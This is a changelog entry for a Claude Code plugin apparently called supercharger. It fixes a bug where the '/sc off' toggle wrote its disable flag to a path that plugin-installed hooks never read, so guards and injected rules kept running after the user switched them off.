- [2.23.37] - 2026-07-28 — fix(sc): **`/sc off` was a silent no-op on plugin installs — rules and guards kept running.** Hooks resolve the kill-switch flag as `${CLAUDE_PLUGIN_DATA:-~/.claude/supercharger}/scope/.supercharger-disabled` (lib-suppress.sh), so a **plugin** install reads `$CLAUDE_PLUGIN_DATA/scope`. But `sc-toggle.sh` hard-coded the *classic* path (`~/.claude/supercharger/scope`) and had zero `CLAUDE_PLUGIN_DATA` awareness — and it runs from the `/sc` skill **outside** any hook, so that env var isn't set for it to read. Net: `/sc off` wrote the flag where the running plugin hooks never looked → every guard + the SessionStart rule-injector (`prompt-layer-inject`) kept firing, so `rules/supercharger.md` + the prompt layer still loaded despite "off" (user-reported). Fix: `sc-toggle.sh` now globs `~/.claude/plugins/data/*supercharger*/scope` (plus `$CLAUDE_PLUGIN_DATA/scope` when present) and writes/clears/checks the flag in **every** scope dir a hook could read — classic and plugin alike; `off`/`on`/`status` all use the any-flag check.
